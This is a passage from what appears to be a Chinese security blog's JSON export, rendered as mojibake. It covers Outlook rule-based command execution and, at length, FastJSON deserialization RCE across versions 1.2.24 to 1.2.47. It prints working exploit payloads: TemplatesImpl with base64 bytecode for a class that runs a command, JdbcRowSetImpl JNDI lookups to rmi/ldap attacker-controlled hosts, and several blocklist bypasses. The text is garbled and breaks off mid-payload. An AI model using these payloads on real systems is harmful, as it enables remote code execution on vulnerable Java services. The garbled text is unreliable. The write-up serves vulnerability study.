RELAY æŒ‚é’©çš„ï¼Œå¦‚CVE-2018-8581ï¼ŒCVE-2020-17141 ï¼ŒCVE-2020-17143ï¼ŒCVE-2019-1040 OUTLOOK å‘½ä»¤æ‰§è¡ŒOUTLOOK å®¢æˆ·ç«¯æœ‰ä¸€ä¸ª è§„åˆ™ä¸é€šçŸ¥ çš„åŠŸèƒ½ï¼Œé€šè¿‡è¯¥åŠŸèƒ½å¯ä»¥ä½¿outlookå®¢æˆ·ç«¯åœ¨æŒ‡å®šæƒ…å†µä¸‹æ‰§è¡ŒæŒ‡å®šçš„æŒ‡ä»¤ã€‚è‹¥æˆ‘ä»¬è·å¾—æŸç”¨æˆ·çš„å‡­è¯ï¼Œå¯ä»¥é€šè¿‡æ­¤åŠŸèƒ½è®¾ç½®â€œç”¨æˆ·æ”¶åˆ°å«æŒ‡å®šå­—ç¬¦çš„é‚®ä»¶æ—¶ æ‰§è¡ŒæŒ‡å®šçš„æŒ‡ä»¤æ¯”å¦‚clac.exeâ€ï¼Œå½“ç”¨æˆ·ç™»å½•outlookå®¢æˆ·ç«¯å¹¶è®¿é—®åˆ°æ­¤é‚®ä»¶æ—¶ï¼Œå®ƒçš„ç”µè„‘ä¾¿ä¼šæ‰§è¡Œcalc.exeã€‚ä½†æ˜¯ï¼Œå½“è§¦å‘åŠ¨ä½œä¸ºå¯åŠ¨åº”ç”¨ç¨‹åºæ—¶ï¼Œåªèƒ½ç›´æ¥è°ƒç”¨å¯æ‰§è¡Œç¨‹åºï¼Œå¦‚å¯åŠ¨ä¸€ä¸ªexeç¨‹åºï¼Œä½†æ— æ³•ä¸ºåº”ç”¨ç¨‹åºä¼ é€’å‚æ•°ï¼Œæƒ³è¦ç›´æ¥ä¸Šçº¿ï¼Œæˆ‘ä»¬å¯ä»¥å°†EXEæ”¾åˆ°æŸå…±äº«ç›®å½•ä¸‹ï¼Œæˆ–è€…ç›´æ¥ä¸Šä¼ åˆ°ç”¨æˆ·çš„æœºå™¨ã€‚ å…·ä½“æ­¥éª¤ä¸ºæ‰“å¼€è§„åˆ™ä¸é€šçŸ¥åŠŸèƒ½ï¼Œç„¶åæ–°å»ºåŠŸèƒ½ï¼Œåœ¨æ¥æ”¶åˆ°æŸæ¡ä»¶é‚®ä»¶æ—¶å¯åŠ¨æŒ‡å®šåº”ç”¨ç¨‹åº æ”¶åˆ°å«abcå†…å®¹çš„é‚®ä»¶åï¼ŒæˆåŠŸå¼¹è®¡ç®—å™¨","categories":[],"tags":[{"name":"ä¸€äº›åº”ç”¨çš„æ”»å‡»æ–¹å¼","slug":"ä¸€äº›åº”ç”¨çš„æ”»å‡»æ–¹å¼","permalink":"http://const27.com/tags/%E4%B8%80%E4%BA%9B%E5%BA%94%E7%94%A8%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/"}]},{"title":"æµ…æFastJSONååºåˆ—åŒ–æ¼æ´ï¼ˆ1.2.24â€”â€”1.2.68ï¼‰","slug":"æµ…æFastJSONFååºåˆ—åŒ–æ¼æ´","date":"2021-09-07T19:05:14.205Z","updated":"2021-09-07T19:04:32.235Z","comments":true,"path":"2021/09/08/æµ…æFastJSONFååºåˆ—åŒ–æ¼æ´/","link":"","permalink":"http://const27.com/2021/09/08/%E6%B5%85%E6%9E%90FastJSONF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"FastJSON ç®€ä»‹FastJson æ˜¯ä¸€ä¸ªç”±é˜¿é‡Œå·´å·´ç ”å‘çš„javaåº“ï¼Œå¯ä»¥æŠŠjavaå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼ï¼Œä¹Ÿå¯ä»¥æŠŠJSONå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡ã€‚ https://github.com/alibaba/fastjson ğŸ‘ˆé¡¹ç›®åœ°å€ â€œè‡ª2017å¹´3æœˆ15æ—¥ï¼Œfastjsonå®˜æ–¹ä¸»åŠ¨çˆ†å‡ºå…¶åœ¨1.2.24åŠä¹‹å‰ç‰ˆæœ¬å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œé«˜å±å®‰å…¨æ¼æ´ä»¥æ¥ï¼Œå„ç§æ–°å‹ç»•è¿‡å§¿åŠ¿å±‚å‡ºä¸ç©·ã€‚â€œâ€”â€”c014 FASTJSONå’‹ç”¨ç­”æ¡ˆï¼šç›´æ¥POMå¯¼å…¥ï¼Œæ–¹ä¾¿åœ°ä¸€æ‰¹ &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt; &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt; &lt;version&gt;x.x.xx&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt; import com.alibaba.fastjson.JSON fastjsonæœ‰ä¸¤ç§å¸¸è§çš„å¤„ç†JSONçš„æ–¹æ³• JSON.toJSONString()æ–¹æ³•ï¼šå¯å°†å¯¹è±¡è½¬æ¢æˆJSONå­—ç¬¦ä¸² JSON.parseObject()æ–¹æ³•ï¼šå°†JSONå­—ç¬¦ä¸²è½¬æ¢æˆå¯¹è±¡ã€‚ ä¸‹é¢çœ‹ä¸€æ³¢å®ä¾‹ï¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå°†å…¶è½¬ä¸ºJSONï¼Œç„¶åå†è½¬å›å¯¹è±¡ã€‚åŒæ—¶å¯ä»¥å‘ç°ï¼Œåœ¨JSONåºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ç±»çš„getxxxæ–¹æ³•ï¼›åœ¨JSONååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ç±»çš„æ„é€ æ–¹æ³• public class App &#123; public static class User&#123; private String id; User()&#123; System.out.println(&quot;User go&quot;); &#125; public void setId(String ids)&#123; System.out.println(&quot;setId go&quot;); this.id&#x3D;ids; &#125; public String getId()&#123; System.out.println(&quot;GetId go&quot;); return this.id; &#125; &#125; public static void main(String[] args)&#123; User a &#x3D; new User(); String json &#x3D; JSON.toJSONString(a); System.out.println(json); System.out.println(JSON.parseObject(json,User.class)); &#125;&#125; User goGetId go&#123;&#125;User goorg.example.App$User@36d4b5c FASTJSON ååºåˆ—åŒ–æ¼æ´èµ·æºæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæŠŠJSONååºåˆ—åŒ–çš„è¯­å¥æ˜¯ JSON.parseObject(json,User.class)ï¼Œåœ¨æŒ‡å®šJSONæ—¶ï¼Œè¿˜éœ€è¦æŒ‡å®šå…¶æ‰€å±çš„ç±»ï¼Œæ˜¾å¾—ä»£ç å°±å¾ˆè‡ƒè‚¿ï¼Œæ‰€ä»¥å¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨@type(autotype)å­—ç¬¦æ®µæ¥ä½¿å…¶ä¸é‚£ä¹ˆè‡ƒè‚¿ã€‚åƒä¸‹é¢è¿™æ ·ï¼Œåœ¨JSONé€šè¿‡æŒ‡å®š@typeçš„å€¼æ¥å®ç°å®šä½æŸç±»ã€‚ JSON.parseObject(&quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.example.App$User\\&quot;,\\&quot;id\\&quot;:\\&quot;123\\&quot;&#125;&quot;) è™½è¯´è¿™ä¹ˆåšå¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯ä»¥è¿™ç§æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œä¼šæ‰§è¡Œç±»çš„æ„é€ æ–¹æ³•å’Œå±æ€§ç›¸å…³çš„getï¼Œsetæ–¹æ³•ã€‚ public class App &#123; public static class User&#123; private String id; User()&#123; System.out.println(&quot;User go&quot;); &#125; public void setId(String ids)&#123; System.out.println(&quot;setId go&quot;); this.id&#x3D;ids; &#125; public String getId()&#123; System.out.println(&quot;GetId go&quot;); return this.id; &#125; &#125; public static void main(String[] args)&#123; System.out.println(JSON.parseObject(&quot;&#123;\\&quot;@type\\&quot;:\\&quot;org.example.App$User\\&quot;,\\&quot;id\\&quot;:\\&quot;123\\&quot;&#125;&quot;)); &#125;&#125; User gosetId goGetId go&#123;&quot;id&quot;:&quot;123&quot;&#125; æ‰€ä»¥åœ¨è¿™ä¸ªJSONååºåˆ—åŒ–æ¥å£å¤„ï¼Œæˆ‘ä»¬ä¼ å…¥æ¶æ„çš„JSONï¼Œå°±å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„æ„é€ æ–¹æ³•ä»¥åŠå±æ€§ç›¸å…³çš„getï¼Œsetæ–¹æ³•ã€‚å¦‚æœæŸç±»çš„ç›¸å…³æ–¹æ³•é‡Œæœ‰å±é™©çš„ä»£ç ï¼ˆå¦‚æ‰§è¡ŒæŸä¸ªå‘½ä»¤ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ æ¶æ„JSONè¾¾åˆ°RCEçš„ä½œç”¨ã€‚ å¦å¤–ï¼ŒJSON.parseObject(â€œ{&quot;@type&quot;:&quot;org.example.App$User&quot;,&quot;id&quot;:&quot;123&quot;}â€,Feature.SupportNonPublicField) ï¼Œå¯ä»¥ç›´æ¥ä¸ºprivateæˆå‘˜èµ‹å€¼ï¼ˆä¸åŠ Feature.SupportNonPublicFieldæ˜¯æ— æ³•å¯¹privateæˆå‘˜èµ‹å€¼çš„ï¼‰ å„ç‰ˆæœ¬å¤ç°1.2.24TemplatesImplæ˜¯çš„ï¼Œå°±æ˜¯7U21é“¾é‡Œé¢çš„TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl è¿™ä¸ªç±»æœ¬èº«å°±å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä¼šå°†æˆå‘˜å˜é‡_bytecodesçš„æ•°æ®ä½œä¸ºç±»çš„å­—èŠ‚ç è¿›è¡ŒnewInsantceæ“ä½œä»è€Œè°ƒç”¨å…¶æ„é€ æ–¹æ³•æˆ–staticå—ã€‚æ•…å¯ä»¥fastjsonä¸ºå¥‘æœºå»è°ƒç”¨æ­¤ç±»ã€‚ä½†æ˜¯ç”±äº_name å’Œ_bytecodes æ˜¯ç§æœ‰å±æ€§ï¼Œæ‰€ä»¥éœ€è¦FASTJSONååºåˆ—åŒ–æ¥å£æœ‰Feature.SupportNonPublicFieldå‚æ•°æ‰èƒ½å®ç°ï¼Œåˆ©ç”¨æ¡ä»¶å¾ˆè‹›åˆ»ï¼Œä½†æ˜¯æ¡ä»¶å…è®¸çš„è¯å°±å¾ˆæ–¹ä¾¿ï¼Œpayloadæ‰“è¿‡å»å°±å®Œäº‹ã€‚ â€œ_tfactoryè¿™ä¸ªå­—æ®µåœ¨TemplatesImplæ—¢æ²¡æœ‰getæ–¹æ³•ä¹Ÿæ²¡æœ‰setæ–¹æ³•ï¼Œè¿™æ²¡å…³ç³»ï¼Œæˆ‘ä»¬è®¾ç½®_tfactoryä¸º{ },fastjsonä¼šè°ƒç”¨å…¶æ— å‚æ„é€ å‡½æ•°å¾—_tfactoryå¯¹è±¡ï¼Œè¿™æ ·å°±è§£å†³äº†æŸäº›ç‰ˆæœ¬ä¸­åœ¨defineTransletClasses()ç”¨åˆ°ä¼šå¼•ç”¨_tfactoryå±æ€§å¯¼è‡´å¼‚å¸¸é€€å‡ºã€‚â€œ payload&#123; &quot;@type&quot; : &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;, &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;], &quot;_name&quot; : &quot;a&quot;, &quot;_tfactory&quot; : &#123;&#125;, &quot;outputProperties&quot; : &#123;&#125;&#125; _bytecodesçš„ç±»é•¿è¿™æ ·,ç¼–è¯‘ç”ŸæˆEvil.classï¼Œå°†å­—èŠ‚ç è¯»å‡ºå¹¶ç”¨base64åŠ å¯†ï¼Œä½œä¸º_bytecodes import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Evil extends AbstractTranslet&#123;static &#123; System.err.println(&quot;Pwned&quot;); try &#123; String[] cmd &#x3D; &#123;&quot;calc&quot;&#125;; java.lang.Runtime.getRuntime().exec(cmd).waitFor(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException &#123; &#x2F;&#x2F; anything &#125; @Override public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException &#123; &#x2F;&#x2F; anything &#125;&#125; JdbcRowSetImplcom.sun.rowset.JdbcRowSetImpl,é€šè¿‡JNDIæ³¨å…¥æ¥å®ç°RCEã€‚ä½†éœ€æ³¨æ„JNDIæ³¨å…¥æœ‰JDKç‰ˆæœ¬é™åˆ¶ï¼Œé«˜ç‰ˆæœ¬éœ€è¦è¿›è¡Œç»•è¿‡ã€‚ æˆ‘ä»¬çš„payloadä¸€èˆ¬é•¿è¿™æ · &#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;ip:port&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true&#125;or&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;ip:1099&#x2F;exp&quot;,&quot;autoCommit&quot;:true&#125; æŠŠè¿™ä¸ªpayloadæ‰“è¿‡å»ï¼Œä¼šæ‰§è¡ŒsetAutoCommit()ï¼ŒåˆsetAutoCommit()æ‰§è¡Œäº†connct()å‡½æ•°ï¼Œå…¶å¦‚ä¸‹ã€‚connect()ä¼šå¯¹dataSourceNameå±æ€§è¿›è¡Œä¸€ä¸ªInitialContext.lookup(dataSourceName),ä»è€Œå®ç°JNDIæ³¨å…¥ã€‚ private Connection connect() throws SQLException &#123; if(this.conn !&#x3D; null) &#123; return this.conn; &#125; else if(this.getDataSourceName() !&#x3D; null) &#123; try &#123; InitialContext var1 &#x3D; new InitialContext(); DataSource var2 &#x3D; (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() !&#x3D; null &amp;&amp; !this.getUsername().equals(&quot;&quot;)?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection(); &#125; catch (NamingException var3) &#123; throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString()); &#125; &#125; else &#123; return this.getUrl() !&#x3D; null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null; &#125; &#125; 1.2.25æ›´æ–°æœºåˆ¶1.2.24åŠä»¥å‰ç‰ˆæœ¬å°±è·Ÿç™½çº¸ä¸€æ ·éšä¾¿æ‰“ï¼Œåœ¨1.2.25å¼€å§‹åŠ å…¥äº†é»‘ç™½åå•æœºåˆ¶ æˆ‘ä»¬ç»§ç»­ç”¨1.2.24çš„payloadï¼ˆè¿™é‡Œç”¨TemplatesImplçš„payloadï¼‰å»æ‰“ï¼Œä¼šå‘ç°æŠ¥é”™autotypeä¸æ”¯æŒ ç©¶å…¶åŸå› ï¼Œæ˜¯å› ä¸ºåœ¨com.alibaba.fastjson.parser.ParserConfig åŠ å…¥äº†CheckAutoTypeæ–¹æ³• com.alibaba.fastjson.parser.ParserConfig !public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) åœ¨å…¶ä¸­æœ‰ä¸ªautotypesupportå±æ€§ï¼Œå¦‚æœä¸ºfalseï¼Œé‚£ä¹ˆå°±ä¼šæ£€æµ‹jsonä¸­@typeçš„å€¼ å¼€å¤´æ˜¯å¦ä¸é»‘åå•ä¸­çš„å€¼ä¸€æ ·ï¼Œè‹¥ä¸€æ ·å°±ç›´æ¥è¿”å›ä¸€ä¸ªå¼‚å¸¸ï¼Œç„¶ååŠ è½½ç™½åå•ä¸­çš„ç±» if (!autoTypeSupport) &#123; \\\\é»‘åå•æ£€æµ‹ï¼Œclassnameæ˜¯ä¼ å…¥ç±»çš„å…¨åï¼ŒdenyListæ˜¯é»‘åå• for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123; String deny &#x3D; denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; &#125; for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123; String accept &#x3D; acceptList[i]; if (className.startsWith(accept)) &#123; clazz &#x3D; TypeUtils.loadClass(typeName, defaultClassLoader); if (expectClass !&#x3D; null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName()); &#125; return clazz; &#125; &#125; &#125; é»‘åå•é•¿è¿™æ · è‹¥autotypesupportå¼€å¯ï¼Œåˆ™ä¼šå…ˆç™½åå•åŠ è½½ï¼Œåé»‘åå•æ£€æµ‹ if (autoTypeSupport || expectClass !&#x3D; null) &#123; for (int i &#x3D; 0; i &lt; acceptList.length; ++i) &#123; String accept &#x3D; acceptList[i]; if (className.startsWith(accept)) &#123; return TypeUtils.loadClass(typeName, defaultClassLoader); &#125; &#125; for (int i &#x3D; 0; i &lt; denyList.length; ++i) &#123; String deny &#x3D; denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; &#125;&#125; åé¢çš„è®¸å¤šæ›´æ–°éƒ½æ˜¯å¯¹checkAutotypeä»¥åŠæœ¬èº«æŸäº›é€»è¾‘ç¼ºé™·å¯¼è‡´çš„æ¼æ´è¿›è¡Œä¿®å¤ï¼Œä»¥åŠé»‘åå•çš„ä¸æ–­å¢åŠ ã€‚ bypass 1ï¼ˆL;æ³•ï¼‰1.2.25-1.2.41å½“autoTypeSupportå¼€å¯æˆ–expectClassä¸ä¸ºç©ºæ—¶ï¼Œä¼šè°ƒç”¨ä¸€ä¸ªloadclassæ–¹æ³• if (this.autoTypeSupport || expectClass !&#x3D; null) &#123; clazz &#x3D; TypeUtils.loadClass(typeName, this.defaultClassLoader);&#125; è€Œåœ¨å…¶ä¸­ï¼Œè‹¥ç±»åä»¥Lå¼€å¤´ï¼›ç»“å°¾ï¼Œåˆ™ä¼šæŠŠè¿™ä¸¤ä¸ªå­—ç¬¦å»æ‰å¹¶åŠ è½½ç±»ã€‚ â€œè‡³äºä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§å¥‡æ€ªçš„å¤„ç†ï¼ŒL å’Œ ; è¿™ä¸€å¯¹å­—ç¬¦å…¶å®æ˜¯ JVM å­—èŠ‚ç ä¸­ç”¨æ¥è¡¨ç¤ºç±»åçš„ï¼šâ€ if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123; String newClassName &#x3D; className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader);&#125; æ‰€ä»¥åœ¨autotypesupportå¼€å¯æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹payloadæ¥bypass &#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;ip:1099&quot;,&quot;autoCommit&quot;:true&#125; å¦‚ä½•å¼€å¯autotypesupportï¼Ÿåªéœ€åœ¨jsonè¢«è§£æå‰åŠ å…¥å¦‚ä¸‹ä»£ç å³å¯ ParserConfig.getGlobalInstance().setAutoTypeSupport(true); bypass 2ï¼ˆjsonå†…ç½®ï¼‰1.2.25-1.2.47 1.2.25-1.2.32ç‰ˆæœ¬ï¼šæœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯AutoTypeSupportåè€Œä¸èƒ½æˆåŠŸè§¦å‘ï¼› 1.2.33-1.2.47ç‰ˆæœ¬ï¼šæ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½èƒ½æˆåŠŸåˆ©ç”¨ï¼› &#123; &quot;a&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;, &quot;autoCommit&quot;:true &#125;&#125; 1.2.42æ›´æ–°æœºåˆ¶42ç‰ˆæœ¬ä¸­å¼€å‘äººå‘˜å°†æ˜æ–‡é»‘åå•æ”¹æˆäº†hashé»‘åå•ï¼Œå·²ç»æœ‰äººç¢°æ’å‡ºäº†ä¸å°‘ï¼Œæ„ä¹‰ä¸å¤§ï¼›åœ¨å¤„ç†25é»‘åå•ç»•è¿‡çš„æ—¶å€™åšäº†ä¸€ä¸ªæ ¡éªŒï¼Œå¦‚æœç±»åä»¥Lå¼€å¤´ï¼Œ;ç»“å°¾ï¼Œåˆ™ä¼šç”¨stubstringå¤„ç†ä¸€ä¸‹(è¿™ä¸ªåˆ¤æ–­æ˜¯ç”±HASHæ¥åˆ¤æ–­çš„ï¼Œçœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼ï¼‰ï¼š if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L &#x3D;&#x3D; 655701488918567152L) &#123; className &#x3D; className.substring(1, className.length() - 1);&#125; bypassï¼ˆåŒå†™ç»•è¿‡ï¼‰é‚£ä¹ˆç›´æ¥ä¸€æ‰‹åŒå†™ç»•è¿‡ &#123; &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;, &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;127.0.0.1:2357&#x2F;Command8&quot;, &quot;autoCommit&quot;:true&#125; 1.2.42æ›´æ–°æœºåˆ¶é’ˆå¯¹åŒå†™ç»•è¿‡å¥—äº†ä¸ªå­åˆ¤æ–­ã€‚ if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L &#x3D;&#x3D; 655701488918567152L) &#123; if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L &#x3D;&#x3D; 655656408941810501L) &#123; throw new JSONException(&quot;autoType is not support. &quot; + typeName); &#125; className &#x3D; className.substring(1, className.length() - 1); &#125; BypassTypeUtils.loadClass ä¸­é™¤äº†å¯¹L;è¿›è¡Œåˆ¤æ–­ï¼Œè¿˜æœ‰å¯¹[è¿›è¡Œäº†åˆ¤æ–­ &#125; else if (className.charAt(0) &#x3D;&#x3D; &#39;[&#39;) &#123; Class&lt;?&gt; componentType &#x3D; loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass();&#125; å›´ç»•è¿™ä¸ªå±•å¼€ï¼Œæ„é€ å¦‚ä¸‹payloadï¼Œå…·ä½“ä¸ºå•¥è¿™ä¹ˆæ„é€ æ²¡æœ‰ç»†è·Ÿï¼Œåæ­£è·Ÿ[æœ‰å…³ &#123; &quot;@type&quot; : &quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;[,&#123; &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAE